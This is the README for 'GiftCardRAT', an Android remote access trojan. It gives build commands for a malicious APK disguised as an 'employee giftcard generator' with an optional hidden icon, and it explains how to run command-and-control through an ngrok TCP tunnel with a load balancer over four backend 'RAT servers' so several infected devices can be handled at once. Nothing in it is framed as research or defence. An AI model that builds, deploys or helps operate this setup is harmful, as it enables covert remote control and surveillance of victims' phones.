# GiftCardRAT - Multi-Device Configuration Guide

## 📝 Centralized Configuration

All server and APK settings are managed through `server_config.json`. Edit this one file to configure your entire system!

### Configuration File: `server_config.json`

```json
{
  "ngrok": {
    "ip": "4.tcp.eu.ngrok.io",     // Your ngrok TCP URL
    "port": "14324"                  // Your ngrok TCP port
  },
  "loadbalancer": {
    "listen_port": 8888,             // Port load balancer listens on (ngrok forwards here)
    "backend_ports": [8889, 8890, 8891, 8892]  // Backend RAT servers
  },
  "apk": {
    "output_name": "employee-giftcard-generator.apk",
    "hide_icon": false               // Show/hide app icon on device
  }
}
```

## 🚀 Quick Start

### 1. Update Your Ngrok Configuration

Edit `server_config.json` and change the ngrok IP and port:

```json
{
  "ngrok": {
    "ip": "your-new-url.ngrok.io",
    "port": "12345"
  },
  ...
}
```

### 2. Build APK (Automatically Uses Config)

```powershell
python build_apk.py
```

That's it! The APK will be built with the settings from `server_config.json`.

### 3. Start Multi-Server System

```powershell
.\start_multi.ps1
```

The load balancer will automatically use the ports from `server_config.json`.

### 4. Start Ngrok

```powershell
ngrok tcp 8888
```

Copy the ngrok URL and update `server_config.json` with the new values, then rebuild the APK.

## 🔧 Advanced Usage

### Override Config with Command Line

You can still override config file settings using command line arguments:

```powershell
# Build APK with custom settings (overrides config file)
python build_apk.py -i 192.168.1.100 -p 8085

# Hide app icon
python build_apk.py --hide-icon

# Custom output filename
python build_apk.py -o custom-name.apk
```

### Start Load Balancer with Custom Ports

```powershell
# Override listen port
python ngrok_loadbalancer.py 9999

# Override listen port and backend start port
python ngrok_loadbalancer.py 9999 9000  # Backends will be 9000-9003
```

## 📁 File Structure

```
GiftCardRAT/
├── server_config.json          # ⭐ CENTRALIZED CONFIG FILE
├── build_apk.py                # APK builder (reads from config)
├── fixed_server.py             # Backend RAT server
├── ngrok_loadbalancer.py       # Load balancer (reads from config)
├── start_multi.ps1             # Launches all servers
└── Android/                    # Android app source code
```

## 🔄 Typical Workflow

When your ngrok URL changes:

1. **Update config file:**
   ```json
   {
     "ngrok": {
       "ip": "new-url.ngrok.io",
       "port": "54321"
     }
   }
   ```

2. **Rebuild APK:**
   ```powershell
   python build_apk.py
   ```

3. **Install on device:**
   ```powershell
   adb install -r employee-giftcard-generator.apk
   ```

4. **System is ready!** (Load balancer already uses the correct ports)

## 🎯 Multi-Device Architecture

```
Android Device → ngrok (new-url.ngrok.io:54321)
                    ↓
              Load Balancer (localhost:8888)
                    ↓ [distributes to ONE backend]
        ┌───────────┴───────────┬───────────┐
        ↓                       ↓           ↓
    127.0.0.1:8889        127.0.0.1:8890  127.0.0.1:8891  127.0.0.1:8892
    [Backend 1]           [Backend 2]     [Backend 3]     [Backend 4]
```

**Supports up to 4 concurrent Android devices!**

## 💡 Benefits

- ✅ **Single source of truth** - One config file for everything
- ✅ **No more mistakes** - Update in one place, use everywhere
- ✅ **Easy updates** - Change ngrok URL in seconds
- ✅ **Still flexible** - Command line overrides still work
- ✅ **Self-documenting** - JSON format is clear and readable

## 🐛 Troubleshooting

**APK not connecting?**
1. Check `server_config.json` has correct ngrok URL
2. Verify ngrok is running: `ngrok tcp 8888`
3. Verify servers are running: `.\start_multi.ps1`
4. Rebuild APK: `python build_apk.py`

**Load balancer shows no backends?**
1. Make sure backend servers started: Check the 4 terminal windows
2. Check ports 8889-8892 are free: `netstat -ano | findstr "888"`

**Want to change backend ports?**
1. Edit `server_config.json` → `loadbalancer.backend_ports`
2. Update `start_multi.ps1` to start servers on new ports
